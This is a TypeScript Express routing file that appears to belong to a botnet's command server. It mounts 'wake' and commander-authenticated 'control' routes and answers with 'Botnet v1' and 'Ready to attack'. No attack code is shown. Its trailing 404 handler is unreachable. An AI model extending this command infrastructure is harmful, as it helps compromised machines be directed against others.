import { Application, NextFunction, Request, Response } from "express";
import wakeRouter from './wake'
import {authCommander} from '../middleware/auth'
import controlRouter from './control'

const route = (app: Application) => {

    app.use('/wake', wakeRouter)

    app.use('/control', authCommander, controlRouter)

    app.use('/', (req: Request, res: Response, next: NextFunction) => {
        res.status(200).json({
            info: 'Botnet v1',
            status: 'Ready to attack 🤖'
        })
    })

    app.use('/', (req: Request, res: Response, next: NextFunction) => {
        res.status(404).json('No Service Found')
    })

}

export default route